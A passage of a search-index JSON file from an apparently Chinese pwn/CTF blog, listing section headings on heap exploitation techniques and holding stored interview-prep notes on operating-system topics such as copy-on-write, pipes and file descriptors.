成器\",\"282\":\"v-e329e17e#基本使用\",\"283\":\"v-d6013428\",\"284\":\"v-d6013428#重要知识点\",\"285\":\"v-d6013428#tcahe机制\",\"286\":\"v-d6013428#机制\",\"287\":\"v-d6013428#利用tcache泄露地址\",\"288\":\"v-43bd25bc\",\"289\":\"v-43bd25bc#原理\",\"290\":\"v-43bd25bc#脚本\",\"291\":\"v-77dd3320\",\"292\":\"v-77dd3320#分析一下题\",\"293\":\"v-77dd3320#chunk分析\",\"294\":\"v-77dd3320#漏洞学习\",\"295\":\"v-77dd3320#先学习unlink漏洞\",\"296\":\"v-77dd3320#流程\",\"297\":\"v-77dd3320#调试技巧\",\"298\":\"v-77dd3320#学习路线\",\"299\":\"v-b7f9189e\",\"300\":\"v-b7f9189e#版本\",\"301\":\"v-b7f9189e#读题\",\"302\":\"v-b7f9189e#错误思路\",\"303\":\"v-b7f9189e#失败原因\",\"304\":\"v-6ff5a7c0\",\"305\":\"v-6ff5a7c0#源码\",\"306\":\"v-6ff5a7c0#漏洞利用图\",\"307\":\"v-64cbeebf\",\"308\":\"v-64cbeebf#源码分析-largebin-malloc\",\"309\":\"v-64cbeebf#unsortedbin的合并-入链-分配操作\",\"310\":\"v-64cbeebf#遍历的开始-梦的开始\",\"311\":\"v-64cbeebf#调试\",\"312\":\"v-64cbeebf#安全检查机制\",\"313\":\"v-64cbeebf#直接返回smallbin-chunk情况\",\"314\":\"v-64cbeebf#从unsortedbin中移除\",\"315\":\"v-64cbeebf#大小刚好相等情况\",\"316\":\"v-64cbeebf#归类入链操作\",\"317\":\"v-64cbeebf#small-和-large最终入bin操作\",\"318\":\"v-64cbeebf#smallbin的fwd-bck赋值\",\"319\":\"v-64cbeebf#largebin-入bin链和chunk-size链\",\"320\":\"v-64cbeebf#从largebin中获取chunk\",\"321\":\"v-64cbeebf#chunk脱链-remainder-chunk入链\",\"322\":\"v-64cbeebf#返回被切割后的chunk\",\"323\":\"v-64cbeebf#从topchunk中获取chunk\",\"324\":\"v-64cbeebf#int-free-源码\",\"325\":\"v-64cbeebf#漏洞利用\",\"326\":\"v-c4a7106c\",\"327\":\"v-c4a7106c#堆管理器\",\"328\":\"v-c4a7106c#流程\",\"329\":\"v-c4a7106c#chunk结构\",\"330\":\"v-c4a7106c#申请内存的过程\",\"331\":\"v-c7dd73e6\",\"332\":\"v-c7dd73e6#tsl-了解\",\"333\":\"v-c7dd73e6#gdb-如何查-fs\",\"334\":\"v-c7dd73e6#bin\",\"335\":\"v-c7dd73e6#free-源码分析\",\"336\":\"v-c7dd73e6#malloc源码分析\",\"337\":\"v-c7dd73e6#fastbin\",\"338\":\"v-c7dd73e6#tcache\",\"339\":\"v-c7dd73e6#fastbin-dup\",\"340\":\"v-c7dd73e6#tcache利用\",\"341\":\"v-2c979d9a\",\"342\":\"v-2c979d9a#tcache-dup\",\"343\":\"v-2c979d9a#unsortedbin\",\"344\":\"v-2c979d9a#consolidate\",\"345\":\"v-2c979d9a#unsafeunlink-off-by-one\",\"346\":\"v-52fac821\",\"347\":\"v-52fac821#主分配区-和-非主分配区\",\"348\":\"v-52fac821#多线程分配\",\"349\":\"v-52fac821#流程\",\"350\":\"v-52fac821#调用链\",\"351\":\"v-52fac821#arena-get\",\"352\":\"v-52fac821#arena-get2\",\"353\":\"v-52fac821#int-new-arena-new-arena\",\"354\":\"v-52fac821#reused-arena\",\"355\":\"v-2751bf8d\",\"356\":\"v-2751bf8d#题目\",\"357\":\"v-2751bf8d#原理\",\"358\":\"v-2751bf8d#实践\",\"359\":\"v-2751bf8d#修改思路\",\"360\":\"v-2751bf8d#结果\",\"361\":\"v-495e7439\",\"362\":\"v-495e7439#安全检查机制\",\"363\":\"v-495e7439#利用原理\",\"364\":\"v-495e7439#利用\",\"365\":\"v-495e7439#构造chunk-header\",\"366\":\"v-495e7439#构造fd-bk\",\"367\":\"v-495e7439#构造bk-fd\",\"368\":\"v-495e7439#构造合并chunk\",\"369\":\"v-495e7439#脚本\",\"370\":\"v-750d4f64\",\"371\":\"v-750d4f64#审题\",\"372\":\"v-750d4f64#大致利用原理\",\"373\":\"v-750d4f64#泄露libc-heap\",\"374\":\"v-750d4f64#伪造fake-chunk\",\"375\":\"v-750d4f64#示意图\",\"376\":\"v-750d4f64#fastbin合并机制\",\"377\":\"v-750d4f64#构造fakecchunk\",\"378\":\"v-750d4f64#泄露tls-0x30\",\"379\":\"v-750d4f64#fd加密机制\",\"380\":\"v-750d4f64#劫持exit-funcs链表\",\"381\":\"v-f211345e\",\"382\":\"v-f211345e#参考文章\",\"383\":\"v-f211345e#条件\",\"384\":\"v-f211345e#house-of-apple1原理\",\"385\":\"v-f211345e#覆盖vatble\",\"386\":\"v-f211345e#触发exit\",\"387\":\"v-f211345e#调用-io-wstrn-overflow\",\"388\":\"v-f211345e#覆写数据\",\"389\":\"v-f211345e#结构体-io-file-complete\",\"390\":\"v-f211345e#结构体-io-wide-data\",\"391\":\"v-f211345e#结构体-io-wstrnfile\",\"392\":\"v-f211345e#示意图\",\"393\":\"v-f211345e#house-of-apple-2原理\",\"394\":\"v-f211345e#io-overflow调用\",\"395\":\"v-f211345e#io-wfile-overflow的调用\",\"396\":\"v-f211345e#示意图-1\",\"397\":\"v-f211345e#原理脚本\",\"398\":\"v-2d1aad9b\",\"399\":\"v-2d1aad9b#核心结构体\",\"400\":\"v-2d1aad9b#file\",\"401\":\"v-2d1aad9b#vtable\",\"402\":\"v-2d1aad9b#io函数函数的原理\",\"403\":\"v-2d1aad9b#fopen函数\",\"404\":\"v-2d1aad9b#调试源码-深入理解\",\"405\":\"v-2d1aad9b#进入open64\",\"406\":\"v-2d1aad9b#malloc-部分\",\"407\":\"v-2d1aad9b#源码\",\"408\":\"v-2d1aad9b#调试\",\"409\":\"v-2d1aad9b#初始化-io-no-init\",\"410\":\"v-2d1aad9b#源码-1\",\"411\":\"v-2d1aad9b#调试-1\",\"412\":\"v-2d1aad9b#vtable表赋值\",\"413\":\"v-2d1aad9b#源码-2\",\"414\":\"v-2d1aad9b#调试-2\",\"415\":\"v-2d1aad9b#链接部分\",\"416\":\"v-2d1aad9b#源码-3\",\"417\":\"v-2d1aad9b#调试-3\",\"418\":\"v-2d1aad9b#打开文件\",\"419\":\"v-2d1aad9b#源码-4\",\"420\":\"v-2d1aad9b#调试-4\",\"421\":\"v-6d1ad62f\",\"422\":\"v-6d1ad62f#利用条件\",\"423\":\"v-6d1ad62f#io-flush-all-lockp-libc-2-23\",\"424\":\"v-6d1ad62f#获取fp\",\"425\":\"v-6d1ad62f#所有的文件流\",\"426\":\"v-6d1ad62f#条件\",\"427\":\"v-6d1ad62f#libc2-24-防御机制\",\"428\":\"v-6d1ad62f#io-validate-vtable\",\"429\":\"v-6d1ad62f#libc2-24-io-file利用\",\"430\":\"v-6d1ad62f#小知识点\",\"431\":\"v-6d1ad62f#对-io-buf-base进行劫持\",\"432\":\"v-bc73e7e4\",\"433\":\"v-bc73e7e4#tcp-ip-udp\",\"434\":\"v-bc73e7e4#socket的加入\",\"435\":\"v-bc73e7e4#websocket\",\"436\":\"v-318791e4\",\"437\":\"v-318791e4#php扩展学习\",\"438\":\"v-318791e4#heap相关学习\",\"439\":\"v-318791e4#small-malloc-and-free\",\"440\":\"v-318791e4#调试\",\"441\":\"v-318791e4#malloc\",\"442\":\"v-318791e4#free\",\"443\":\"v-e8a0a482\",\"444\":\"v-e8a0a482#栈迁移\",\"445\":\"v-e8a0a482#栈迁移的大致操作\",\"446\":\"v-e8a0a482#栈迁移核心\",\"447\":\"v-4e6402dc\",\"448\":\"v-4e6402dc#部分前置知识讲解\",\"449\":\"v-4e6402dc#got表和plt表详细解说\",\"450\":\"v-4e6402dc#dl-runtime-resolve部分详细解说\",\"451\":\"v-4e6402dc#reloc-index\",\"452\":\"v-ed95b87a\",\"453\":\"v-ed95b87a#程序寻找libc的顺序\",\"454\":\"v-ed95b87a#linux程序加载简化流程\",\"455\":\"v-ed95b87a#查看程序当前信息\",\"456\":\"v-ed95b87a#修改程序的ld和libc地址\",\"457\":\"v-596613ec\",\"458\":\"v-596613ec#解释部分函数\",\"459\":\"v-596613ec#正式做题\",\"460\":\"v-596613ec#流程\",\"461\":\"v-596613ec#动调\",\"462\":\"v-596613ec#脚本\",\"463\":\"v-654f50a4\",\"464\":\"v-654f50a4#linux中常用的指令\",\"465\":\"v-654f50a4#ifs变量\",\"466\":\"v-654f50a4#ifs-的工作原理\",\"467\":\"v-654f50a4#这里举列子\",\"468\":\"v-654f50a4#payload\",\"469\":\"v-53e9535c\",\"470\":\"v-53e9535c#实验float的存储数据\",\"471\":\"v-53e9535c#尝试覆盖\",\"472\":\"v-0de2da6d\",\"473\":\"v-0de2da6d#babygift\",\"474\":\"v-0de2da6d#fastfastfast\",\"475\":\"v-0de2da6d#脚本\",\"476\":\"v-0de2da6d#fmt\",\"477\":\"v-0de2da6d#exit-hook地址写入栈\",\"478\":\"v-0de2da6d#选择\",\"479\":\"v-0de2da6d#脚本-1\",\"480\":\"v-0de2da6d#guestbook\",\"481\":\"v-0de2da6d#hello-world\",\"482\":\"v-0de2da6d#intermittent\",\"483\":\"v-0de2da6d#inviisible-flag\",\"484\":\"v-0de2da6d#malloc-flag\",\"485\":\"v-0de2da6d#ez1-0-mips\",\"486\":\"v-0de2da6d#ez2-0-arm\",\"487\":\"v-0de2da6d#one-byte\",\"488\":\"v-0de2da6d#劫持freechunk\",\"489\":\"v-0de2da6d#ptmalloc2-its-myheap\",\"490\":\"v-0de2da6d#劫持head-chunk\",\"491\":\"v-0de2da6d#脚本-2\",\"492\":\"v-0de2da6d#ptmalloc2-it-s-myheap-pro-glibc2-35下的exit函数打法\",\"493\":\"v-0de2da6d#审题\",\"494\":\"v-0de2da6d#大致利用原理\",\"495\":\"v-0de2da6d#泄露libc-heap\",\"496\":\"v-0de2da6d#伪造fake-chunk\",\"497\":\"v-0de2da6d#示意图\",\"498\":\"v-0de2da6d#fastbin合并机制\",\"499\":\"v-0de2da6d#构造fakecchunk\",\"500\":\"v-0de2da6d#泄露tls-0x30\",\"501\":\"v-0de2da6d#fd加密机制\",\"502\":\"v-0de2da6d#劫持exit-funcs链表\",\"503\":\"v-0de2da6d#ptmalloc2-it-s-myheap-plus-orw-exit\",\"504\":\"v-0de2da6d#static-link\",\"505\":\"v-0de2da6d#simple-srop\",\"506\":\"v-e1e3da16\",\"507\":\"v-4e4da9e9\",\"508\":\"v-1eb8e595\",\"509\":\"v-6366463d\",\"510\":\"v-1c92de30\",\"511\":\"v-4725fbe0\",\"512\":\"v-130815f0\",\"513\":\"v-10a26406\",\"514\":\"v-8b560ff4\",\"515\":\"v-c5280e6c\",\"516\":\"v-a4d3f0b4\",\"517\":\"v-49ae21d2\",\"518\":\"v-0c3cb238\",\"519\":\"v-4d490a83\",\"520\":\"v-18c37324\",\"521\":\"v-15660bb0\",\"522\":\"v-4b630a84\",\"523\":\"v-76d1c547\",\"524\":\"v-669e794a\",\"525\":\"v-3b62790d\",\"526\":\"v-019bbaf0\"},\"fieldIds\":{\"h\":0,\"t\":1,\"c\":2},\"fieldLength\":{\"0\":[2,30],\"1\":[1,45],\"2\":[3,10],\"3\":[1,9],\"4\":[1,25],\"5\":[2,6],\"6\":[1,2],\"7\":[3],\"8\":[2,40],\"9\":[1,18],\"10\":[1,45],\"11\":[1,1],\"12\":[1,26],\"13\":[1,61],\"14\":[1,28],\"15\":[1,44],\"16\":[1,52],\"17\":[1,11],\"18\":[1,5],\"19\":[1,4],\"20\":[1,32],\"21\":[1,16],\"22\":[1,6],\"23\":[1,15],\"24\":[1,17],\"25\":[1,5],\"26\":[1,3],\"27\":[1,2],\"28\":[1,1],\"29\":[1,5],\"30\":[2,31],\"31\":[1,5],\"32\":[1,13],\"33\":[1],\"34\":[3,1],\"35\":[1],\"36\":[1,51],\"37\":[2,14],\"38\":[2,28],\"39\":[1,10],\"40\":[1,46],\"41\":[2,38],\"42\":[1,26],\"43\":[2,80],\"44\":[1,26],\"45\":[1,3],\"46\":[2,25],\"47\":[1,90],\"48\":[1,15],\"49\":[1,34],\"50\":[1,63],\"51\":[3],\"52\":[1,9],\"53\":[1,24],\"54\":[1,9],\"55\":[1,30],\"56\":[7,9],\"57\":[2,15],\"58\":[4],\"59\":[3,28],\"60\":[3,48],\"61\":[5],\"62\":[2,2],\"63\":[2,16],\"64\":[1,2],\"65\":[2,4],\"66\":[1,24],\"67\":[1,4],\"68\":[1,29],\"69\":[4,24],\"70\":[1,52],\"71\":[1,17],\"72\":[3],\"73\":[1,70],\"74\":[1,50],\"75\":[1,4],\"76\":[2,2],\"77\":[5,10],\"78\":[1,4],\"79\":[2,23],\"80\":[4],\"81\":[4],\"82\":[1,13],\"83\":[1,2],\"84\":[1,10],\"85\":[3],\"86\":[3],\"87\":[1,13],\"88\":[3],\"89\":[3,1],\"90\":[3],\"91\":[1],\"92\":[1],\"93\":[1],\"94\":[3],\"95\":[3],\"96\":[3],\"97\":[3],\"98\":[1],\"99\":[1,2],\"100\":[1],\"101\":[1],\"102\":[3,1],\"103\":[3,9],\"104\":[1],\"105\":[1,8],\"106\":[1],\"107\":[3,2],\"108\":[4,2],\"109\":[2,2],\"110\":[3,2],\"111\":[3,1],\"112\":[3,1],\"113\":[1,10],\"114\":[2,5],\"115\":[1,4],\"116\":[1],\"117\":[2],\"118\":[1,19],\"119\":[1],\"120\":[1,6],\"121\":[1,45],\"122\":[1,11],\"123\":[1,69],\"124\":[1,54],\"125\":[1,75],\"126\":[1,46],\"127\":[2,49],\"128\":[1,6],\"129\":[1],\"130\":[1,8],\"131\":[2,127],\"132\":[2,10],\"133\":[1,17],\"134\":[1,52],\"135\":[1],\"136\":[1,19],\"137\":[1,4],\"138\":[1,2],\"139\":[2,2],\"140\":[1,38],\"141\":[1,22],\"142\":[1,10],\"143\":[2,34],\"144\":[1,11],\"145\":[3,10],\"146\":[1,9],\"147\":[1,25],\"148\":[2,6],\"149\":[1,2],\"150\":[2,40],\"151\":[1,18],\"152\":[1,45],\"153\":[1,1],\"154\":[1,26],\"155\":[1,61],\"156\":[1,28],\"157\":[1,44],\"158\":[1,52],\"159\":[1,11],\"160\":[1,5],\"161\":[1,4],\"162\":[1,32],\"163\":[1,16],\"164\":[1,6],\"165\":[1,15],\"166\":[1,17],\"167\":[1,5],\"168\":[1,3],\"169\":[1,2],\"170\":[1,1],\"171\":[1,5],\"172\":[2,31],\"173\":[1,5],\"174\":[1,13],\"175\":[1],\"176\":[1,51],\"177\":[2,14],\"178\":[2,28],\"179\":[1,10],\"180\":[1,46],\"181\":[2,38],\"182\":[1,26],\"183\":[2,80],\"184\":[1,26],\"185\":[1,3],\"186\":[2,25],\"187\":[1,90],\"188\":[1,15],\"189\":[1,34],\"190\":[1,63],\"191\":[3],\"192\":[1,9],\"193\":[1,24],\"194\":[1,9],\"195\":[1,30],\"196\":[7,9],\"197\":[2,15],\"198\":[4],\"199\":[3,28],\"200\":[3,48],\"201\":[5],\"202\":[2,2],\"203\":[2,16],\"204\":[1,2],\"205\":[2,4],\"206\":[1,24],\"207\":[1,4],\"208\":[1,29],\"209\":[4,24],\"210\":[1,52],\"211\":[1,17],\"212\":[3],\"213\":[1,70],\"214\":[1,50],\"215\":[1,4],\"216\":[2,2],\"217\":[5,10],\"218\":[1,4],\"219\":[2,23],\"220\":[4],\"221\":[4],\"222\":[1,13],\"223\":[1,2],\"224\":[1,10],\"225\":[3],\"226\":[3],\"227\":[1,13],\"228\":[3],\"229\":[3,1],\"230\":[3],\"231\":[1],\"232\":[1],\"233\":[1],\"234\":[3],\"235\":[3],\"236\":[3],\"237\":[1],\"238\":[2,42],\"239\":[1,15],\"240\":[1,95],\"241\":[1,30],\"242\":[1,24],\"243\":[1,64],\"244\":[1,36],\"245\":[1,21],\"246\":[1,28],\"247\":[1,8],\"248\":[1,3],\"249\":[1,2],\"250\":[1,28],\"251\":[1,6],\"252\":[3,120],\"253\":[1,14],\"254\":[1,115],\"255\":[1,41],\"256\":[1,18],\"257\":[1,12],\"258\":[1,147],\"259\":[1,7],\"260\":[2,5],\"261\":[1,85],\"262\":[1,37],\"263\":[6,26],\"264\":[1,1],\"265\":[2,17],\"266\":[1,6],\"267\":[1],\"268\":[2,7],\"269\":[2,4],\"270\":[1,26],\"271\":[1],\"272\":[1,23],\"273\":[2,32],\"274\":[2,27],\"275\":[2,24],\"276\":[1,9],\"277\":[2,14],\"278\":[1,4],\"279\":[1,34],\"280\":[1,28],\"281\":[1,36],\"282\":[1,15],\"283\":[5],\"284\":[1,29],\"285\":[1,16],\"286\":[1,62],\"287\":[1,39],\"288\":[1,5],\"289\":[1,22],\"290\":[1,40],\"291\":[3],\"292\":[1,53],\"293\":[1,20],\"294\":[1,6],\"295\":[1,20],\"296\":[1,52],\"297\":[1,1],\"298\":[2,2],\"299\":[8,6],\"300\":[1,6],\"301\":[1,9],\"302\":[1,25],\"303\":[1,17],\"304\":[3,5],\"305\":[1,44],\"306\":[1,19],\"307\":[6,34],\"308\":[4,30],\"309\":[3],\"310\":[3,26],\"311\":[1,70],\"312\":[1,72],\"313\":[2,62],\"314\":[1,9],\"315\":[1,40],\"316\":[1,7],\"317\":[3,18],\"318\":[2,20],\"319\":[3,83],\"320\":[1,7],\"321\":[3,137],\"322\":[1,15],\"323\":[1,4],\"324\":[4,397],\"325\":[1,47],\"326\":[1,9],\"327\":[1,16],\"328\":[1,2],\"329\":[1,44],\"330\":[1,35],\"331\":[3,11],\"332\":[2],\"333\":[4,11],\"334\":[1],\"335\":[2,16],\"336\":[1,10],\"337\":[1,5],\"338\":[1,21],\"339\":[2,152],\"340\":[1,3],\"341\":[4,1],\"342\":[2,94],\"343\":[1,7],\"344\":[1,58],\"345\":[5,63],\"346\":[3,19],\"347\":[3,163],\"348\":[1,6],\"349\":[1,53],\"350\":[2,14],\"351\":[2,46],\"352\":[2,115],\"353\":[4,165],\"354\":[2,3],\"355\":[5,8],\"356\":[1,8],\"357\":[1,29],\"358\":[1,117],\"359\":[1,90],\"360\":[1,7],\"361\":[6,13],\"362\":[1,7],\"363\":[1,6],\"364\":[1],\"365\":[2,96],\"366\":[2,22],\"367\":[2,37],\"368\":[1,58],\"369\":[1,152],\"370\":[5],\"371\":[1,22],\"372\":[2,57],\"373\":[2,44],\"374\":[2,15],\"375\":[1,7],\"376\":[1,54],\"377\":[1,31],\"378\":[1,91],\"379\":[1,4],\"380\":[2,95],\"381\":[4],\"382\":[2,19],\"383\":[1,6],\"384\":[3,20],\"385\":[1,7],\"386\":[1,6],\"387\":[4,13],\"388\":[1,30],\"389\":[4,41],\"390\":[4,58],\"391\":[3,27],\"392\":[1,2],\"393\":[4,15],\"394\":[3,20],\"395\":[4,79],\"396\":[1,16],\"397\":[1,110],\"398\":[2,18],\"399\":[1,25],\"400\":[1,21],\"401\":[1,47],\"402\":[1,9],\"403\":[1,73],\"404\":[2,33],\"405\":[1,2],\"406\":[2],\"407\":[1,21],\"408\":[1,106],\"409\":[4],\"410\":[1,60],\"411\":[1,21],\"412\":[1],\"413\":[1,9],\"414\":[1,10],\"415\":[1],\"416\":[1,8],\"417\":[1,89],\"418\":[1],\"419\":[1,17],\"420\":[1,21],\"421\":[1,7],\"422\":[1,8],\"423\":[8,12],\"424\":[1,2],\"425\":[1,4],\"426\":[1,27],\"427\":[3,7],\"428\":[3,51],\"429\":[4,3],\"430\":[1,7],\"431\":[4,27],\"432\":[1,20],\"433\":[3,29],\"434\":[1,8],\"435\":[1,13],\"436\":[2,13],\"437\":[1,21],\"438\":[1,106],\"439\":[4,55],\"440\":[1,7],\"441\":[1,50],\"442\":[1,40],\"443\":[3],\"444\":[1,3],\"445\":[1,15],\"446\":[1,78],\"447\":[1],\"448\":[1],\"449\":[1,109],\"450\":[4,15],\"451\":[2,57],\"452\":[1,20],\"453\":[1,31],\"454\":[1,22],\"455\":[1,10],\"456\":[5,32],\"457\":[1,1],\"458\":[1,58],\"459\":[1,77],\"460\":[1,45],\"461\":[1,76],\"462\":[1,85],\"463\":[3,42],\"464\":[1,140],\"465\":[1,2],\"466\":[2,19],\"467\":[2,15],\"468\":[1,1],\"469\":[4,62],\"470\":[1,76],\"471\":[1,33],\"472\":[1],\"473\":[1,122],\"474\":[1,20],\"475\":[1,137],\"476\":[1,15],\"477\":[3,2],\"478\":[1,2],\"479\":[1,109],\"480\":[1,104],\"481\":[2,89],\"482\":[1,119],\"483\":[2,197],\"484\":[2,140],\"485\":[4,92],\"486\":[4,113],\"487\":[2,8],\"488\":[1,182],\"489\":[3,14],\"490\":[2,28],\"491\":[1,212],\"492\":[8],\"493\":[1,22],\"494\":[2,57],\"495\":[2,44],\"496\":[2,15],\"497\":[1,7],\"498\":[1,54],\"499\":[1,31],\"500\":[1,91],\"501\":[1,4],\"502\":[2,95],\"503\":[7,246],\"504\":[2,125],\"505\":[2,132],\"506\":[1],\"507\":[1],\"508\":[1],\"509\":[1],\"510\":[1],\"511\":[2],\"512\":[1],\"513\":[1],\"514\":[1],\"515\":[1],\"516\":[1],\"517\":[2],\"518\":[1],\"519\":[2],\"520\":[1],\"521\":[2],\"522\":[2],\"523\":[1],\"524\":[1],\"525\":[1],\"526\":[1]},\"averageFieldLength\":[1.709677419354839,31.92296008387564],\"storedFields\":{\"0\":{\"h\":\"Blog Home\",\"t\":[\"This is a blog home page demo.\",\"To use this layout, you should set both layout: BlogHome and home: true in the page front matter.\",\"For related configuration docs, please see blog homepage.\"]},\"1\":{\"h\":\"友情链接\",\"t\":[\"wake0p\",\"wakeup - 沉淀-变得强大\",\"doujia\",\"http://114.132.95.24/\",\"giraffexiu\",\"碇シンジ – giraffe (giraffexiu.love)\",\"sh4d0w\",\"NotionNext BLOG | 这是一个由NotionNext生成的站点 (sh4d0w.life)\",\"yuan0x1\",\"https://yuan0x1.cn/\",\"clp\",\"[Charlie's char] lies here. (charlie-ping.github.io)\",\"Am1re\",\"http://43.138.229.144/\",\"wwzx\",\"Hexo (pzlzx.github.io)\",\"meimeng\",\"Me1_m3ng – 小客栈\"]},\"2\":{\"h\":\"面试准备(热更)\",\"t\":[\"初入职场必备丨二进制面试问题汇总 - FreeBuf网络安全行业门户pwn方向的分析 预计中旬左右\",\"秋招复习笔记——八股文部分：操作系统 - 知乎 (zhihu.com)\"]},\"3\":{\"h\":\"操作系统\",\"t\":[\"csapp:《深入理解计算机系统（CSAPP）》全书学习笔记（详细） - 知乎 (zhihu.com)\"]},\"4\":{\"h\":\"套接字\",\"t\":[\"套接字是一个重要的概念。套接字是一种用于网络通信的接口，它可以实现进程之间的通信和数据传输。在使用套接字进行网络编程时，关闭套接字是一个必要的操作。关闭套接字可以释放资源，避免程序出现内存泄漏等问题。在关闭套接字时，我们通常会用到 close() 和 shutdown() 函数。这两个函数虽然都能够关闭套接字，但是它们的使用方式和作用有所不同。\",\"当调用 close() 函数时，文件描述符的引用计数减1。只有当引用计数变为0时，文件描述符才真正被关闭，并且与其相关的资源被释放。\",\"在fork的时候 子进程会让所有文件描述符copy下来 并且引用计数+1 close本质是对文件描述符的引用计数进行的减1\"]},\"5\":{\"h\":\"Linux 中内存管理\",\"t\":[\"这里有总结linux内存管理（详解） - 知乎 (zhihu.com) 根据总结来进行学习\"]},\"6\":{\"h\":\"tcp和udp区别\",\"t\":[\"直接看博客中写的文章 这里就不重复赘述了\"]},\"7\":{\"h\":\"四种锁的区别(TODO)\"},\"8\":{\"h\":\"cow 与row\",\"t\":[\"这里涉及快照的概念 COW、ROW快照技术原理 - 华为 (huawei.com) 快照就用了cow\",\"写时复制技术详解(COW) - 知乎 (zhihu.com)\",\"写时复制（Copy-on-write，简称COW）是一种计算机程序设计领域的优化策略。其核心思想是，如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。这过程对其他的调用者都是透明的。此作法主要的优点是如果调用者没有修改该资源，就不会有副本（private copy）被创建，因此多个调用者只是读取操作时可以共享同一份资源。性能较为低下 因为会导致父节点更新 导致写放大也就是本来期望修改一个节点 但是会导致需要修改4个节点之类\",\"简单来说就是 不修改就不拷贝 修改再单独拷贝\"]},\"9\":{\"h\":\"用途\",\"t\":[\"虚拟内存管理中的写时复制 \",\"一般共享访问的页面标记为可读 然后当一个task尝试写入数据的时候 内存管理单元(MMU)会抛出一个异常 内核处理该异常 并且为task分配一个物理内存并复制数据到次内存到中 重新向MMU发出执行该task的写操作\",\"数据存储的写时复制(cow) \",\"linux等文件管理系统采用了cow策略\",\"数据库也采用了该策略\",\"软件应用的写时复制 \",\"cpp中std::string类 以前采用 后面禁止了\"]},\"10\":{\"h\":\"虚拟内存\",\"t\":[\"秋招复习笔记——八股文部分：操作系统 - 知乎 (zhihu.com)\",\"[【操作系统基础】内存管理——虚拟内存概念及分页机制 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/651057404#:~:text=通常一个页表项需要记录20bit的物理页号，因此这样一个虚拟内存管理系统分配给一个程序的页表至少需要2^20*20bit的容量，至少是2.6MByte，而如果是64bit的地址空间，一个页表至少是11%2C258%2C999GByte。 这种机制显然是不合理的。,因此操作系统通过多级页表的方法减少驻留在内存中的页面尺寸，减小页表。 具体来讲，高层页表的页表项并不保存物理页号，而是保存下一级页表的起始地址，如同页表基址寄存器的功能一样。 在这种方式下，操作系统不需要把所有的页表项都存放到内存中，部分页表项成为空洞，在需要用到这个页表项对应的空间时才进行填写。)\",\"操作系统通过多级页表的方法减少驻留在内存中的页面尺寸，减小页表。\",\"虚拟空间连续 但是物理空间不一定连续\",\"当内存空间不足的时候 会把其他正在运行的进程 最近没有使用的内存页面释放暂时写在硬盘上 然后需要了就加载回来\",\"和中断处理机制一样用了选择子和页内偏移的方式来寻址 我们通过页号来获取基础地址再加上页内偏移\",\"多级页表 \",\"通过多级页表来实现逻辑地址到地址的映射\"]},\"11\":{\"h\":\"虚拟地址的cow\",\"t\":[\"不同的进程是可以让虚拟地址共同映射到同一块物理内存地址的\"]},\"12\":{\"h\":\"内存对齐\",\"t\":[\"一文轻松理解内存对齐 - 知乎 (zhihu.com)\",\"要是不对齐的话 系统需要花费额外的操作去读取 十分浪费性能 自然对齐性能利用率高 \",\"这里提及的额外的操作是因为比如32位机子 一次性读取数据就是32位也就是4字节 64位操作系统一次性读取是64位也就是8字节\",\"假如没有内存对齐机制，数据可以任意存放，现在一个int变量存放在从地址1开始的联系四个字节地址中，该处理器去取数据时，要先从0地址开始读取第一个4字节块,剔除不想要的字节（0地址）,然后从地址4开始读取下一个4字节块,同样剔除不要的数据（5，6，7地址）,最后留下的两块数据合并放入寄存器。这需要做很多工作。\"]},\"13\":{\"h\":\"管道\",\"t\":[\"[进程间通信(IPC) 系列 | 管道(pipe) - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/423964093#:~:text=所谓管道，是指用于连接一个读进程和一个写进程，以实现它们之间通信的共享文件，又称 pipe,文件。 向管道（共享文件）提供输入的发送进程（即写进程），以字符流形式将大量的数据送入管道；而接收管道输出的接收进程（即读进程），可从管道中接收数据。)\",\"管道中最重要的2个方法就是管道的读写。从上述的分析来看，读写进程共同操作内核中的数据缓冲区，若有缓冲区可写，则进程往缓冲区中写，若条件不允许写，则进程休眠让出 CPU。读操作同理。\",\"从上述管道读写操作可知，父子进程之所以能够通过 pipe 进行通信，是因为在内核中共同指向了同一个pipe_inode_info 对象，共同操作同一个内存页。\",\"返回的文件描述符是一个数组:fd[0] fd[1] 0表示读取 1表示写入\",\"pipe文件\",\"互斥性 就是管道有一方进行读写操作的时候 另一方必须等待\",\"同步性 管道必须写入后/读取后 然后进入睡眠 等待下一步操作\",\"检测对方是否存在\"]},\"14\":{\"h\":\"并发与并行\",\"t\":[\"[并发与并行的区别（超级通俗易懂）_并发和并行区别秒懂-CSDN博客](https://blog.csdn.net/scarificed/article/details/114645082#:~:text=并发是指一个处理器同时处理多个任务。 并行是指多个处理器或者是多核的处理器同时处理多个不同的任务。,并发是逻辑上的同时发生（simultaneous），而并行是物理上的同时发生。 来个比喻：并发是一个人同时吃三个馒头，而并行是三个人同时吃三个馒头。)\",\"并发是一个cpu同时处理多个任务 单一时间只能执行一种指令 但是在各个任务之间来回切换\",\"并行是多个cpu同时执行多个任务 多个任务物理意义上的同时运行\",\"并发与并行\"]},\"15\":{\"h\":\"文件描述符\",\"t\":[\"件描述符（file descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4......[彻底弄懂 Linux 下的文件描述符（fd） - 锦瑟，无端 - 博客园 (cnblogs.com)](https://www.cnblogs.com/cscshi/p/15705033.html#:~:text=文件描述符（file,descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I%2FO操作的系统调用都通过文件描述符来实现。 同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。)\",\"进程之间文件描述符相互独立 可以互不影响\",\"可以通过fork让 不同的进程之间 同一个文件描述符指向 同一个文件\",\"本质也就是先用一个数组来存每个进程的空闲文件描述符数组 然后数组存储的是一个下标再指向真正的文件描述符数组 然后里面存储着详细信息 包含filenode等信息就可以找到文件本体了\"]},\"16\":{\"h\":\"fork函数\",\"t\":[\"论fork()函数与Linux中的多线程编程 - 知乎 (zhihu.com)，\",\"有关 COW (CopyOnWrite) 